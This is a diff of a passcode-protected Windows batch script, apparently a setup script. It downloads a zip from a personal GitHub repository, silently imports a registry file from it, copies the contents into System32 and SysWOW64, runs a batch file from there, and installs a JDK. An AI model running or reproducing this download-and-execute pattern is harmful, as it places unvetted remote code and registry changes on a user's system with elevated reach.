@@ -27,7 +27,13 @@ if %attempts% GEQ %MAX_ATTEMPTS% (
 
 set /a attempts+=1
 echo Enter passcode to run this script (input is hidden):
-for /f "delims=" %%H in ('powershell -NoProfile -Command "$p=Read-Host -AsSecureString -Prompt 'Enter passcode'; $B=[Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($p)); $h=[System.BitConverter]::ToString((New-Object System.Security.Cryptography.SHA256Managed).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($B))).Replace('-','').ToLower(); Write-Output $h"') do set "ENTERED_HASH=%%H"
+for /f "delims=" %%H in (
+    'powershell -NoProfile -Command ^
+    "$p=Read-Host -AsSecureString -Prompt ''Enter passcode''; ^
+    $B=[Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($p)); ^
+    $h=[System.BitConverter]::ToString((New-Object System.Security.Cryptography.SHA256Managed).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($B))).Replace(''-'','').ToLower(); ^
+    Write-Output $h"'
+) do set "ENTERED_HASH=%%H"
 
 if "%ENTERED_HASH%"=="%PASSHASH%" (
     echo Passcode accepted.
@@ -37,54 +43,68 @@ if "%ENTERED_HASH%"=="%PASSHASH%" (
 )
 
 :: -------------------------------
-:: BEGIN: Download and setup
+:: Download and setup
 :: -------------------------------
-
-set "url=https://github.com/itisvikas7392/7392045049/archive/refs/heads/main.zip"
-set "outputFile=cap.zip"
 set "outputFolder=%USERPROFILE%\Downloads"
-set "zipPath=%outputFolder%\%outputFile%"
 
-echo [*] Downloading repository zip from: %url%
-powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%zipPath%'"
+:: -------------------------------
+:: Download GitHub repo zip
+:: -------------------------------
+set "repoUrl=https://github.com/itisvikas7392/7392045049/archive/refs/heads/main.zip"
+set "repoZip=%outputFolder%\repo.zip"
+echo [*] Downloading repository zip...
+powershell -Command "Invoke-WebRequest -Uri '%repoUrl%' -OutFile '%repoZip%'"
 if %errorlevel% neq 0 (
-    echo [!] Download failed! Exiting.
+    echo [!] Repo download failed. Exiting.
     pause
     exit /b
 )
-echo [*] Download completed successfully!
+echo [*] Download completed!
 
-echo [*] Extracting archive...
-powershell -NoProfile -Command "Expand-Archive -Path '%zipPath%' -DestinationPath '%outputFolder%' -Force" >nul 2>&1
+:: -------------------------------
+:: Extract zip
+:: -------------------------------
+echo [*] Extracting repository...
+powershell -NoProfile -Command "Expand-Archive -Path '%repoZip%' -DestinationPath '%outputFolder%' -Force" >nul 2>&1
 if %errorlevel% neq 0 (
     echo [!] Extraction failed!
     pause
     exit /b
 )
-echo [*] Unzipped successfully!
+echo [*] Extracted successfully!
 
-set "regFile=%outputFolder%\7392045049-main\ie.reg"
+set "sourceFolder=%outputFolder%\7392045049-main"
+
+:: -------------------------------
+:: Import registry file
+:: -------------------------------
+set "regFile=%sourceFolder%\ie.reg"
 if not exist "%regFile%" (
     echo [!] Registry file not found: %regFile%
     pause
     exit /b
 )
-
 echo [*] Importing registry settings...
 regedit /s "%regFile%"
 echo [*] Registry import completed!
 
-set "sourceFolder=%outputFolder%\7392045049-main"
+:: -------------------------------
+:: Copy files to System32 / SysWOW64
+:: -------------------------------
 set "system32=%SystemRoot%\System32"
 set "syswow64=%SystemRoot%\SysWOW64"
 
-echo [*] Copying files...
+echo [*] Copying files to %system32%...
 xcopy "%sourceFolder%" "%system32%" /E /Y >nul 2>&1
+
 if exist "%syswow64%" (
+    echo [*] Copying files to %syswow64%...
     xcopy "%sourceFolder%" "%syswow64%" /E /Y >nul 2>&1
 )
-echo [*] Files copied.
 
+:: -------------------------------
+:: Execute any batch files in System32 / SysWOW64
+:: -------------------------------
 if exist "%system32%\Windows7-64bit.bat" (
     pushd "%system32%"
     call "Windows7-64bit.bat"
@@ -100,24 +120,23 @@ if exist "%syswow64%\Windows7-64bit.bat" (
 )
 
 :: -------------------------------
-:: JDK Installation
+:: Download and install JDK
 :: -------------------------------
 set "jdkUrl=https://javadl.oracle.com/webapps/download/AutoDL?BundleId=249203_b291ca3e0c8548b5a51d5a5f50063037"
-set "jdkFile=jdk-installer.exe"
-set "jdkPath=%outputFolder%\%jdkFile%"
+set "jdkFile=%outputFolder%\jdk-installer.exe"
 
-echo [*] Downloading JDK from: %jdkUrl%
-powershell -Command "Invoke-WebRequest -Uri '%jdkUrl%' -OutFile '%jdkPath%'"
-if not exist "%jdkPath%" (
+echo [*] Downloading JDK...
+powershell -Command "Invoke-WebRequest -Uri '%jdkUrl%' -OutFile '%jdkFile%'"
+if not exist "%jdkFile%" (
     echo [!] JDK download failed!
     pause
     exit /b
 )
 
 echo [*] Installing JDK...
-start /wait "" "%jdkPath%"
+start /wait "" "%jdkFile%"
 if %errorlevel% neq 0 (
-    echo [!] JDK installation may have failed or returned a non-zero code.
+    echo [!] JDK installation may have failed.
     pause
     exit /b
 )
